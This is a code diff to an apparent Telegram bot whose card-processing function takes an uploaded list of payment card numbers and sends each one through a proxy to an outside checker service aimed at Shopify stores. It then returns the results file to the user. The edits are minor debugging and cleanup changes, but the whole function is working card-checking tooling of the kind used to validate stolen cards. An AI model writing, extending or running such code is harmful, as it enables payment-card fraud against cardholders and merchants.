@@ -4699,7 +4699,6 @@ async def process_cards(update: Update, file_path: str, file_name: str, site: st
     output_file_path = os.path.join(DOWNLOAD_FOLDER, f"results_{file_name}")
 
     async with aiohttp.ClientSession() as session:
-        # Read all cards from the uploaded file
         with open(file_path, "r", encoding="utf-8") as f:
             cards = [line.strip() for line in f if line.strip()]
 
@@ -4707,13 +4706,15 @@ async def process_cards(update: Update, file_path: str, file_name: str, site: st
             await update.message.reply_text("⚠️ The file is empty.")
             return
 
-        sem = asyncio.Semaphore(5)  # limit concurrency
-        lock = asyncio.Lock()       # protect writes
+        sem = asyncio.Semaphore(5)
+        lock = asyncio.Lock()
 
         async def check_card(card: str):
             async with sem:
                 api_url = f"https://autoshopify-dark.sevalla.app/index.php?site={site}&cc={card}&proxy={PROXY}"
                 print(f"🔎 Checking: {card}")
+
+                response_text = "No Response"  # default
                 try:
                     async with session.get(api_url, timeout=30) as resp:
                         try:
@@ -4725,29 +4726,29 @@ async def process_cards(update: Update, file_path: str, file_name: str, site: st
                 except Exception as e:
                     response_text = f"Request Error: {e}"
 
-                # Append result line into results file
+                # Debug: log what we are writing
+                line = f"{card} => {response_text}\n"
+                print("📝 Writing line:", line)
+
                 async with lock:
                     with open(output_file_path, "a", encoding="utf-8") as out:
-                        out.write(f"{card} => {response_text}\n")
-                print(f"✅ Done: {card} => {response_text}")
+                        out.write(line)
 
-        # Run checks concurrently
         await asyncio.gather(*(check_card(card) for card in cards))
 
-    # Send the result file after processing
     if os.path.exists(output_file_path) and os.path.getsize(output_file_path) > 0:
+        print("📄 Sending result file:", output_file_path)
         await update.message.reply_document(
             document=InputFile(output_file_path, filename=f"results_{file_name}")
         )
     else:
-        await update.message.reply_text("⚠️ Something went wrong, results file is empty.")
+        await update.message.reply_text("⚠️ Something went wrong, results empty.")
 
-    # Cleanup temporary files
     try:
         os.remove(file_path)
         os.remove(output_file_path)
-    except Exception:
-        pass
+    except Exception as e:
+        print("⚠️ Cleanup error:", e)
 
 
 # ---------------- Unified handler ---------------- #
